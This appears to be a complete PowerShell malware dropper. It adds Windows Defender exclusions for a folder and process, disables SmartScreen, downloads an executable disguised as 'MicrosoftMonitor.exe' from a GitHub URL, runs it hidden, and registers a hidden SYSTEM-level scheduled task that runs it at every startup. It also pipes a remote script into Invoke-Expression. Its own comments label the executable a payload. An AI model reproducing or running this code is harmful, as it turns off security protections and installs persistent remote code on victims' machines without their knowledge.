# Variables
$dir = "$env:APPDATA\Windows Networking"
$logFile = Join-Path -Path $dir -ChildPath "install_log.txt"
$exeUrl = "https://github.com/rkx0/SRUTR1.3/raw/refs/heads/main/MicrosoftMonitor.exe"
$exeName = "MicrosoftMonitor.exe"
$exePath = Join-Path -Path $dir -ChildPath $exeName
$excludedProcesses = @("MicrosoftMonitor.exe")
$taskName = "Microsoft Monitor Task"

# Ensure directory exists
if (-not (Test-Path -Path $dir)) {
    New-Item -Path $dir -ItemType Directory -Force | Out-Null
}

# Function to log messages
function Log {
    param ([string]$message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path $logFile -Value "$timestamp - $message"
}

# Add Defender Directory Exclusion
Add-MpPreference -ExclusionPath $dir
Log "Added Defender exclusion for directory: $dir"

# Add Defender Process Exclusion
foreach ($proc in $excludedProcesses) {
    Add-MpPreference -ExclusionProcess $proc
    Log "Added Defender exclusion for process: $proc"
}

# Disable SmartScreen (Session-Based)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"
Log "Disabled SmartScreen for this session"

# Download Executable Payload
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
Log "Downloaded executable to: $exePath"

# Execute the Payload
Start-Process -FilePath $exePath -WorkingDirectory $dir -WindowStyle Hidden
Log "Executed payload: $exePath"

# Create Scheduled Task for Persistence
$action = New-ScheduledTaskAction -Execute $exePath
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings

Register-ScheduledTask -TaskName $taskName -InputObject $task -Force | Out-Null
Log "Created scheduled task '$taskName' to run on startup"

# Install Windows Utility Script from Chris Titus
irm "https://christitus.com/win" | iex
Log "Ran Chris Titus Tech Windows Utility script"

# Completion
Log "Script completed successfully."
